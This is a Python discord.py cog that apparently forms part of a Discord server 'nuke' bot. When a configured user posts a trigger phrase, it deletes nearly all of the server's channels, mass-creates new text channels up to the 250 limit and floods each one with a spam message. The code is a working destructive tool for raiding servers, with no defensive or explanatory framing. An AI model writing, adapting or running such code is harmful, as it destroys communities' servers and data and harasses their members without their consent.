import discord
from discord.ext import commands
import json
import time

from discord.ext.commands import bot

config = json.loads(open('config/set.json', 'r', encoding='utf-8').read())

intents=intents=discord.Intents.all()
intents = discord.Intents()
intents.members = True

intents = discord.Intents(messages=True, guilds=True, reactions=True, members=True)

channelclient = commands.Bot(command_prefix='.', intents = intents)


class channeldelete(commands.Cog):
    def __init__(self, client):
        self.client = client


    #Delete channels
    @commands.Cog.listener()
    async def on_message(self,message):
        if message.author.id == int(config["sizinid"]):
           if config["names"]["patlatmamesajı"] in message.content:
    
                for channel in list(message.guild.channels):
                    if channel.id == message.channel.id:
                        continue                        
                    try:
                        if config["required"]["bütünkanallarısil"]:
                            await channel.delete()
                    except discord.Forbidden:
                        continue
                    except Exception as e:
                        #print("hata : {}".format(e))
                        continue
                a = +1
                while a == 1:
                    await message.guild.create_text_channel(config["names"]["channel_name"])
                    if len(message.guild.channels) == 250:
                        break
                    if config["required"]["spamat"]:
                        for channel in list(message.guild.text_channels):
                            await channel.send(config["names"]["spam_mesaj"])


def setup(client):
    client.add_cog(channeldelete(client))


    